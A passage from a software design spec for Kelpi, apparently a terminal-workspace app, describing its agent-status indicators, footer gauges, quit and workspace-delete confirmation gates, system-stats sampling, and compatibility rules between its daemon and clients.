  posts in-app toasts until granted. The Electron shell needs no permission request:
  `Notification.isSupported()` is the only gate (`notify.ts:26-28`).
- Suppression is decided in the daemon (`packages/core/src/agent/notifications.ts`,
  fed by client focus/visibility reports), which simply does not broadcast a
  notification a client should not show; everything that arrives at a client is
  rendered.

---

## 8. External indicators (menu bar + dock)

A single imperative refresh (`updateExternalIndicators`) recomputes everything;
it fires on every lifecycle event, manual override, chrome-theme change, and app
activation. Semantics:

### 8.1 Aggregation

Walk **all workspaces × visible panes** (parked panes are NOT included here,
unlike the quit/delete gates; `packages/shell/src/agents.ts`, and the web client's
`packages/client/src/chrome/favicon.ts` for the same two numbers):

- `totalWaiting` = panes with `waitingForInput`
- `totalRunning` = panes with `running`
- `items` = one row per non-idle pane: `{ workspaceName, workspaceColor,
  paneTitle: pane.title ?? "Shell", paneID, workspaceID, status }`

### 8.2 Menu-bar icon (macOS; web port: a compact global indicator)

- Terminal glyph, 18×18. Overlay a 6 px dot in the top-right corner:
  **waiting > 0 → waiting color** (waiting wins over running); else
  **running > 0 → running color**; else no dot (icon renders as a template/plain).
- Colors are the resolved chrome-theme `statusWaiting` / `statusRunning`, resolved
  against the OS appearance (the menu bar lives in the OS theme, not the app theme).
- A daemon that is not reachable outranks both: the tray shows a `disconnected` dot in
  the inactive colour (`trayIndicator`, `packages/shell/src/agents.ts:302-310`;
  `packages/shell/src/icon.ts`). Nothing is knowable about agents until it reconnects.

### 8.3 Menu-bar popover

The tray icon opens a native menu (Electron `Tray` + `Menu`), not a custom popover;
the rows are derived in `trayMenuRows` (`packages/shell/src/agents.ts:386-418`) and
wired in `packages/shell/src/status.ts`:

- Daemon unreachable: one disabled row `Daemon not reachable` (and the icon shows the
  `disconnected` dot, §8.2).
- Empty state: one disabled row `✓  All clear`.
- Otherwise, per workspace with non-idle visible panes, sorted by name: a disabled
  header `<marker> <workspace name> - <W> waiting, <R> running` (marker `◉` when the
  workspace has any waiting pane, else `●`: waiting wins, as §8.2), then one clickable
  row per non-idle pane, indented, `<glyph>  <title>` (`◉` waiting / `●` running;
  title = `pane.title ?? label ?? "Shell"`, middle-truncated at 40 characters so the
  command head and the argument tail both survive), sorted by title. No animation and
  no workspace colour dot: a native menu item is text plus an optional image, so the
  pulsing halo becomes the `◉`/`●` distinction and the counts move onto the header.
- Clicking a pane row: raise the window, then ask the daemon to reveal the pane
  (`reveal-request`) so this window's client switches workspace and focuses the pane
  last (the same sequence a clicked notification uses; §8.5 ordering is the client's
  job).
- A separator and the tray's standing rows (Show Kelpi, Quit Kelpi) follow.
- The menu is rebuilt on every count change and on connect/disconnect.

### 8.4 Dock badge (web port: tab badge / title count)

- `waiting > 0` → badge label = the waiting count (number as string)
  (`dockBadgeLabel`, `packages/shell/src/agents.ts:298`; the web client folds the same
  count into `document.title`, `packages/client/src/chrome/favicon.ts`).
- else → no badge.
- On app activation (user switches to the app), the badge is cleared immediately
  and indicators refresh (`status.acknowledgeActivation()` on window `focus`,
  `packages/shell/src/main.ts:556-558`; the focused pane's 600 ms acknowledgment timer
  is also scheduled, §5.8).

### 8.5 Focus-navigation ordering invariant

When jumping to a pane from a popover/notification while the main window isn't
key: raise/activate the window FIRST, then set the active workspace, then focus
the target pane *after* the window has restored its old first responder (e.g. next
tick). Otherwise the window restoring its previous focused surface re-emits a
focus event for the OLD pane and reverts the selection (this bug is real; the
ordering is the fix). For same-workspace jumps from the footer popover, the app
instead makes the target surface first responder immediately while the popover
still holds key. In the web client every "jump to pane" affordance guarantees the
final focus state is the target pane, immune to focus-restoration races: workspace
first, pane last (`packages/client/src/state/notifications.ts`).

---

## 9. Footer status bar (bottom chrome)

24 px-high footer, 11 px font, secondary text color. Left = focused-pane context;
right = system stats + global agent counts + clock.

### 9.1 Left section (focused pane of the active workspace)

`cwd` (home-abbreviated to `~`, middle-truncated) · branch (with branch icon) ·
git diff stats (`doc N +A -B`, matching repo association by longest worktree-path
prefix of the pane cwd; hidden when clean/untracked) · **agent section**.

Agent section renders **only when `pane.agentSessionID != null`**:

- `running`: the kind label (`agentKind ?? "claude"`) in the amber `activeAgent`
  color, plus — only when `agentStartedAt` is set — a live elapsed label ticking
  every second.
- `waitingForInput`: `"awaiting input"` in `statusWaiting` blue.
- `idle`: nothing.

### 9.2 Elapsed label format (`chromeElapsedLabel`)

Shared by footer, pane header, and popovers (`packages/client/src/chrome/theme.ts:545`;
both arguments are epoch milliseconds). `total = max(0, floor(now - start))`
seconds:

- hours > 0 → `"<h>h <m>m"`
- else minutes > 0 → `"<m>m <s>s"`
- else → `"<s>s"`

Examples: `9s`, `4m 9s`, `1h 3m`. Ticks on a 1-second UI timer (view-layer only —
never dispatches state actions).

### 9.3 Right section — global agent counts

Three count items, in order, each `dot · count · label` (count is monospaced,
fixed-width so single→double digit doesn't shift layout):

- **running** (`statusRunning` dot): panes with status `running`.
- **waiting** (`statusWaiting` dot): panes with status `waitingForInput`.
- **inactive** (`statusInactive` dot): panes with `agentSessionID != null` AND
  status `idle` — an attached-but-idle (resumable) agent.

Counts sum over all workspaces' **visible panes** (not parked). Followed by a live
hour:minute clock in the viewer's locale (12- or 24-hour per OS setting, so `2:52 PM`
on a US machine and `14:52` on a UK one; `clockLabel`,
`packages/client/src/chrome/theme.ts:558`), ticking on the shared 1-second timer.

A count item with value > 0 is clickable → opens a 252 px-wide popover titled
"Running agents" / "Awaiting input" / "Inactive agents", listing each matching
pane as `workspaceColorDot workspaceName · paneTitle` (title = `pane.title ??
pane.label ?? "Shell"`), with a live elapsed label on the right **for the running
list only** (when `agentStartedAt` is set). Rows are buttons: clicking switches
to the workspace + focuses the pane (see §8.5 focus-ordering) and closes the
popover. A 0-count item is inert (plain, non-interactive). Empty list inside an
open popover shows "None.".

### 9.4 Pane header agent badge

Every pane has a header; on the right side, **for shell panes with
`agentSessionID != null`**, the badge from §5.9 renders:

- Running: `claude · 4m 9s` (or `codex · …`) — kind label; `·` + live elapsed only
  when `agentStartedAt` is set; and when `backgroundTaskCount > 0`, an extra
  `· N running` segment so "running" reads as "working in the background", not a
  stalled clock. 10 px monospaced, amber, on a rounded 14%-amber pill.
- Waiting: `awaiting input`, blue pill.
- The header also has a status dot elsewhere (left of the title): running/waiting
  use the status colors; idle uses tertiary (dimmed when unfocused).
- Header context menu contains the manual "Status" submenu (§5.7): Idle / Running /
  Awaiting Input.

---

## 10. Quit gate

Applies to quitting the Electron shell (⌘Q, the app menu, the tray's Quit Kelpi, a
signal; every path is intercepted via `before-quit`, `packages/shell/src/quit.ts`).
Closing the window is not a termination path: on macOS the app stays alive in the dock.
Quitting the shell **never stops the daemon**: PTYs and agents keep running, and the
next launch (or a browser on the tailnet) re-attaches to exactly the sessions that were
there (`quit.ts:171-177`, "deliberately absent: anything that stops the daemon"). The
gate that survives is the accident guard: ⌘Q is one keystroke from ⌘W. Decision
procedure:

1. Flush any pending debounced markdown/scratchpad autosaves (`flushPendingSaves`),
   bounded by `QUIT_FLUSH_TIMEOUT_MS` = 750 ms so a flush can never hold the app
   hostage (`quit.ts:111, 158-168`). Runs on every path, including the one that shows
   no dialog. Nothing stops graft sessions.
2. If `confirm-quit-when-active` is **false** → quit. This is a daemon general setting
   (default **true**; `packages/protocol/src/ws/settings.ts:41-49`; the Settings ▸
   Workspaces toggle writes the same key), read off the shell's status WS snapshot via
   `confirmWhenActive`. When the daemon has not reported a value (no connection yet, an
   older daemon), the shell's local `settings.json` `confirmQuitWhenActive` is the
   fallback (`quit.ts:139-142`), so a ⌘Q while the daemon is unreachable still honours a
   suppression the user set.
3. Compute the **activity summary** over all workspaces (`activitySummary`,
   `packages/shell/src/agents.ts:470-480`):
   - `agentCount` = Σ per-workspace `activeAgentCount`, where a workspace's count
     is its panes **plus parked panes** with status ≠ `idle` (running or waiting).
   - `workspaceCount` = number of workspaces with count > 0 (a workspace whose only
     live agents are parked still counts).
4. If the summary is empty → quit with **no dialog** (`shouldConfirmQuit` = setting AND
   `agents > 0`, `packages/shell/src/settings.ts:103-107`).
5. Otherwise a warning (`quitDialogSpec`, `settings.ts:139-150`):
   - Title: `Quit Kelpi?`
   - Body: `<N> agent(s) across <M> workspace(s) are still active. They keep running in
     the background - quitting only closes this window. Reopen Kelpi to attach again.`
     (singular/plural on both nouns; `quitConfirmDetail`, `agents.ts:483-497`). The
     text says the opposite of a "will terminate all sessions" warning on purpose: a
     user who quits by reflex learns their agents survived.
   - Buttons: **Quit** / **Cancel**, with **Cancel** the default (Return key), since ⌘Q
     is the accidental keystroke being guarded and the safe option wins.
   - Suppression checkbox `Don't ask again`: when ticked, persist the setting false
     **regardless of which button was clicked** (honoured even on Cancel,
     `quit.ts:268-269`), written locally first and then through the daemon when it is
     reachable (`quit.ts:145-156`), so an open Settings window re-syncs its toggle.
   - The dialog is shown inside the live renderer when a visible, loaded window exists,
     with the native `dialog.showMessageBox` as the fallback (app-modal when there is no
     window, so a tray or signal quit with no window still asks; `quit.ts:210-245`). A
     second ⌘Q while the dialog is up does not stack another.
6. Quit only on Quit; Cancel aborts.

## 11. Workspace delete gate

Guards deleting a workspace that still has active agents. Two independent
enforcement points:

### 11.1 GUI gate

Entry points: the sidebar workspace context-menu **Delete** item (disabled when
only one workspace exists), and the ⌘W close-pane path **when closing the last
pane of a workspace** (which deletes the workspace instead of the pane;
`closeFocused`, `packages/client/src/App.tsx:1365-1384`). The ⌘W path sends
`allowLast: true`, so it is the one gesture that may delete the last workspace and
reach the "No workspace selected" state (§11.2).

Decision (`shouldDelete(workspaceName, activeAgentCount)`):

- `activeAgentCount` = panes + parked panes with status ≠ idle in that workspace.
- If `activeAgentCount == 0` OR the `confirmWorkspaceDeleteWhenActive` setting is
  false → proceed immediately (return true). Default true; it is a daemon general
  setting, config key `confirm-workspace-delete`
  (`packages/protocol/src/ws/settings.ts:29-38`), so dialogs and the Settings ▸
  Workspaces toggle (`packages/client/src/settings/WorkspacesTab.tsx`) stay in sync
  across clients.
- Otherwise a warning dialog:
  - Title: `Delete “<workspaceName>”?`
  - Body: `This workspace has <N> active agent(s). Deleting it will terminate
    it/them.` (singular/plural).
  - Buttons: **Cancel** default; **Delete** destructive.
  - `Don't ask again` suppression box: persists the setting false regardless of
    button, broadcasts for Settings re-sync.
- Delete proceeds only on Delete.

### 11.2 CLI/server gate (`workspace-delete`)

Server-side, independent of the GUI setting:

- Refuses to delete the **last remaining** workspace
  (`{"ok":false,"error":"refusing to delete the last workspace"}`) unless the request
  carries `allow_last: true` (`packages/daemon/src/handlers/app/workspaces.ts:475-478`,
  read at `:633`). Only the GUI's ⌘W-close-last-pane path sends it (§11.1): the one
  route that may reach zero workspaces and the "No workspace selected" state.
  `kelpi workspace delete` and the sidebar Delete item never do, and
  `packages/protocol/src/wire/decode.ts:325-329` deliberately does not decode
  `allow_last` from the wire, so nothing arriving over the control socket can set it.
- Ambiguous name (matches > 1 workspace, non-UUID):
  `{"ok":false,"error":"workspace name is ambiguous: <name> (use the id)"}`;
  unknown → `workspace not found: <name>`.
- **Running-agents guard**: if `activeAgentCount > 0` and `force` (CLI
  `--force`/`-y`) is not set:
  `{"ok":false,"error":"workspace <name> has <N> running agent(s); pass --force
  to delete anyway","active_agents":N}`. `--force` is honoured independently of
  the GUI "Don't ask again" setting.
- Success reply: `{"ok":true,"workspace_id":...,"workspace_name":...,
  "path": <a shell pane's cwd, preferred over other pane types; omitted when the
  workspace has no panes>}` — `path` powers client-side `--prune-worktree`.

---

## 12. `pane list` exposure of agent state

Each entry in the `pane-list` reply (`packages/daemon/src/handlers/pane/list.ts`)
includes (agent-relevant fields):

```jsonc
{
  "id": "…", "type": "shell", "status": "running",       // always present
  "agent_session_id": "6f9a2c9e-…",   // only when attached (full id in JSON;
                                      // the human table truncates it, "-" when none)
  "agent": "codex",                   // last-known kind — set by lifecycle events,
                                      // never cleared; means "agent last seen
                                      // here", NOT "attached now"
  "background_tasks": 2               // only when > 0
}
```

`workspace list` similarly surfaces `agent_session_id` (the first pane carrying
one) and `last_activity_at` per workspace.

---

## 13. SystemStatsService (footer gauges)

Role: purely view-layer host-resource telemetry in the footer. It never touches
agent state and never dispatches actions — it exists in this spec because it lives
in the same status bar and its display rules are specified here. The sampler runs in
the daemon (`packages/daemon/src/stats/sampler.ts`, probes in
`packages/daemon/src/stats/host.ts`), samples the daemon host, and streams snapshots
to clients as `system-stats` messages.

### 13.1 Snapshot shape

```ts
interface SystemStats {
  cpuPercent: number;        // 0..100 aggregate busy across cores
  memUsedBytes: number; memTotalBytes: number;
  loadAverage1m: number;
  netDownBytesPerSec: number; netUpBytesPerSec: number;
  diskReadBytesPerSec: number; diskWriteBytesPerSec: number;
  diskUsedBytes: number; diskTotalBytes: number;
  // derived: memPercent, diskPercent, netTotal, diskIOTotal
}
```

### 13.2 Sampling rules

- Poll cadence **2 s**, gated by the master "show system stats" setting AND at least
  one attached WS client (`packages/daemon/src/boot/compose.ts:576-580`): no work when
  off or when nobody is watching. Turning the sampler off stops the timer and clears
  the history and every rate baseline; turning it on clears them again, takes one
  immediate sample (so the first gauge appears within a frame rather than after a full
  interval) and then samples every 2 s (`sampler.ts:236-252`). First sample of any rate
  metric reports 0 (no baseline yet).
- CPU: delta of busy (user+system+nice+irq) vs total ticks between samples, clamped
  0–100 (`host.ts:47`).
- Memory used: active + wired + compressed pages × page size (the page size is read
  from `vm_stat`'s header, not assumed; Linux uses `MemTotal - MemAvailable` from
  `/proc/meminfo`); total = physical. Memory is a level, not a rate: when the probe
  fails the last known value is carried forward rather than reporting 0
  (`sampler.ts:120-122, 159`).
- Load: 1-minute load average.
- Network: sum in/out byte counters across non-loopback link-layer interfaces.
  **Counter-reset guard**: if the new summed counter is *lower* than the previous
  sample (32-bit per-interface wrap, or an interface disappearing), report 0 for
  that sample rather than computing a wrapped delta (which would spike to ~1.8e19
  and flatten the auto-scaled sparkline).
- Disk I/O: sum cumulative read/write bytes across block-storage drivers; same
  reset-to-0 guard.
- Disk space: used/total of the home volume.

### 13.3 Display

- Six toggleable metrics in canonical order: `cpu, memory, load, network, diskIO,
  diskSpace` — the footer shows the enabled subset (all gated by the master
  toggle).
- Compact labels: cpu/mem/diskSpace `"<n>%"`; load `"%.2f"`; network/diskIO a
  compact rate.
- **Rate formatting**: units `B K M G T`, dividing by **1000** (not 1024) so values
  stay ≤ 3 digits; decimals drop as magnitude grows (`0B/s`, `1.4M/s`, `47M/s`,
  `999M/s`). **Byte formatting** (memory/disk totals): divide by **1024**, one
  decimal above the B unit (`512B`, `1.5G`).
- Optional per-metric sparkline: rolling history of 60 samples (~2 min), recorded
  for *all* metrics even when hidden (so a newly enabled metric has history).
  Percentage metrics scale to fixed 0–100; others auto-scale to the window max.
  Styles: line (optionally filled) or stacked-dots. Color: user hex override or
  theme secondary.
- Hover popover per gauge: display name, verbose detail (e.g. `↓ 1.2M/s ↑ 340K/s`,
  `12.3G / 32.0G`), a larger filled graph, now/min/max/avg over the window, and
  `last N samples · ~2Ns`.

---

## 14. Invariants and edge cases (checklist)

1. Unknown pane id on any lifecycle message → total no-op (no notification, no
   indicator refresh).
2. Lifecycle routing is by pane id across ALL workspaces (background workspaces
   included) and reaches parked panes too.
3. `status` ≠ idle ⇒ counted as an "active agent" by quit/delete gates (which
   include parked panes); footer counts and menu-bar items use visible panes only.
4. Repeated `start` within a run: the elapsed clock only resets on a non-running →
   running transition — but a `start` arriving while `running` first resets status
   to idle (missed stop), so it does restart the clock. Repeated `stop` with
   background work: idempotent (stays running, count updated).
5. `backgroundTaskCount` reset points: `start`, `error`, `session-start`
   (incl. dual-fires), manual override. `stop`/`notification` set it to the wire
   value. Never persisted.
6. Notification suppression matrix:
   - stop-synthetic: suppressed when (focused AND app active) OR background work.
   - agent notification: suppressed when focused AND app active (background work
     does NOT suppress).
   - error: never suppressed.
   - OSC: suppressed when focused AND app active.
   - Dock bounce: only on stop, only when app inactive AND no background work.
7. `sessionEnded` only clears a *matching* id — plus the `agentProfileName`
   recorded beside it (out-of-order `/clear` safety) — and always persists
   immediately.
8. Dual-fire ordering: primary message first, then the synthesized
   `sessionStarted` — both carry the same `agent` tag (and the same `profile`,
   when the line reported one).
9. Resume commands are typed into PTYs only after passing the session-id allowlist;
   null command = skip silently. 2 s delay after surface creation before typing.
   A tuple's recorded profile env applies only when its command passes that same
   allowlist (§6.1 step 3).
10. On state load: capture resume tuples → clear ids + statuses (keep `agentKind`
    and `agentProfileName`) → spawn surfaces → resume → persist (in that order).
11. `kelpi event` exits 0 silently outside a Kelpi pane; exits 1 loudly on bad event
    type or bad `--agent`; never fails on transport errors (warning only, and
    suppressed by default for hooks; `KELPI_SILENT=1` suppresses everywhere,
    `KELPI_VERBOSE_HOOKS=1` re-enables for events).
12. Sub-agent (`agent_id` present) `start`/`stop` events are dropped CLI-side;
    sub-agent `notification`/`session-*`/`error` still send.
13. The wire stays byte-compatible: `agent` omitted for claude, `background_tasks`
    omitted when 0.
14. Manual status override: shell panes only, resets background count, does not
    survive relaunch.
15. Focus acknowledgment: 600 ms, latest-wins timer; clears only `waitingForInput`;
    removes the pane's desktop notification.
16. Dock badge shows the *waiting* count only; cleared on app activation.
17. Menu-bar dot precedence: waiting > running > none.
18. Suppression checkboxes persist even when the dialog is cancelled.

---

## Compatibility rationale

These items record the quirks Kelpi preserves on purpose, and the places where its
daemon-plus-clients architecture deliberately differs from the single-window app it
replaced, so that the pre-port `kelpi` CLI, existing hook scripts and saved state keep
working:

1. **The module is split across daemon and client.** The state machine (§5), session
   binding/resume (§6), wire parsing (§4), notification *decisions* (§7), and the
   gates' server-side guard (§11.2) live in the daemon and work headless with no
   client attached. Elapsed-time ticking, popovers, the 600 ms focus-acknowledgment
   timer, and dialogs are client-side, but the daemon owns the resulting state changes
   (`clearPaneStatus` is the client→daemon `clear-pane-status` message, so multiple
   attached clients converge).
2. **"App active" and "pane focused" have a multi-client definition.** The legacy app
   had exactly one window; Kelpi has N web clients + an Electron shell. The rule
   (`packages/core/src/agent/notifications.ts`, wired in
   `packages/daemon/src/boot/compose.ts:1098-1099`): `isAppActive` = any connected
   client is visible/focused; `isFocused` = that pane is the focused pane of the active
   workspace in a focused client. The daemon computes notification suppression from
   client focus/visibility reports, and both default to "not active" when no client is
   attached (so notifications fire for headless operation).
3. **Desktop notifications are per-platform.** Electron native notifications in the
   shell (`packages/shell/src/notify.ts`, `status.ts`) and the Web Notifications API
   (with an in-app toast fallback) in browser clients
   (`packages/client/src/state/notifications.ts`). Preserved: the `kelpi-<paneID>`
   replace-on-repost identity, Open (navigate to pane) / Dismiss actions, removal on
   focus acknowledgment, and the suppression matrix. The daemon decides and broadcasts
   to each client; a client renders everything that arrives, with the browser's
   permission state as its only local gate.
4. **Dock badge / bounce / menu-bar icon** are Electron `app.badgeCount` +
   `dock.bounce`, a tray icon with a status dot, and for pure web clients a favicon
   badge / `document.title` count (`packages/client/src/chrome/favicon.ts`).
   Waiting-wins-over-running precedence and clear-on-activation are preserved.
5. **`agentStartedAt` lives in the daemon** (state is central, so it survives workspace
   switches). It is sent to clients as an epoch timestamp in milliseconds; clients
   render the ticking label locally (1 s timer, format §9.2). It remains transient and
   is never persisted.
6. **Persistence contract**: `status`, `agentSessionID`, `agentKind` and
   `agentProfileName` are stored on the pane record; the load-time sequence of §6.1 is
   kept exactly (capture-then-clear, persist after resume). Column naming is free, but
   `pane list --json` keeps emitting `status` (camelCase enum values!),
   `agent_session_id`, `agent`, `background_tasks`.
7. **Resume typing** writes the command text + CR to the PTY (`TerminalInput.sendText`,
   `packages/daemon/src/boot/resume.ts`). The 2 s post-spawn delay and the
   `isSafeSessionID` allowlist are kept: this is a real injection surface
   (socket → DB → PTY).
8. **Wire compatibility is a hard requirement**: the pre-port CLI works unchanged. That
   fixes the six command names, `pane_id`/`session_id`/`agent`/
   `background_tasks`/`title`/`body`/`message` field names, absent-field defaults,
   the fire-and-forget (no reply) contract, and the dual-fire synthesis being
   server-side (old CLIs rely on it).
9. **The `background_tasks` guard is defensive by design**: it's an observed
   Claude Code field. The terminal-exclusion counting stays in the CLI, with the
   terminal-status set ported verbatim (`packages/cli/src/commands/event.ts`).
10. **Gates**: quitting a *client* does NOT kill agents (the daemon keeps PTYs alive;
    that is the architecture's point), so the shell's quit gate (§10) only warns that
    sessions survive and skips the dialog when nothing is active. "Terminate all
    sessions" only happens when the **daemon** stops, and the daemon's own shutdown
    does the flush (persistence) and the bounded PTY kill. The workspace-delete guard
    stays server-side (`--force`), with the client dialog as a UI convenience over the
    same `activeAgentCount`.
11. **System stats** sample the *daemon host's* resources (that's where the agents
    run), via Node in the daemon (`os.cpus` / `os.loadavg`; `vm_stat`, `netstat -ibn`
    and `ioreg` on darwin, `/proc` on Linux) and stream to clients; the 2 s cadence,
    60-sample history, counter-reset-to-0 guard, and the 1000-vs-1024 divisor split
    (rates use 1000, byte sizes use 1024) are kept.
12. **Timers do not thrash state**: elapsed labels and the clock are render-side
    only. The only timer that dispatches is the 600 ms clear-status debounce.
13. **Focus-jump ordering** (§8.5): the web client applies "activate workspace,
    then focus pane last" so focus-restoration races can't revert the selection.
14. **`kelpi install-hooks` / doctor** are client-machine-side tools (hooks run where
    the agent CLI runs). If agents run on remote machines over the tailnet, the hooks
    there need `KELPI_SOCKET=tcp:...` to reach the daemon; the hook config itself is
    unchanged. Hooks installed before the Kelpi rename run a bare `nex event ...`; the
    doctor accepts them as wired and the installer's sweep migrates them to the `kelpi`
    form instead of letting them fire twice (§2.1, §2.3).
15. **Manual status override** has a web UI equivalent of the pane-header context
    menu (Status ▸ Idle/Running/Awaiting Input), shell panes only, and rides the same
    daemon action as everything else (`set-pane-status`,
    `packages/daemon/src/ws/sync.ts:727`) so indicators/persistence follow.
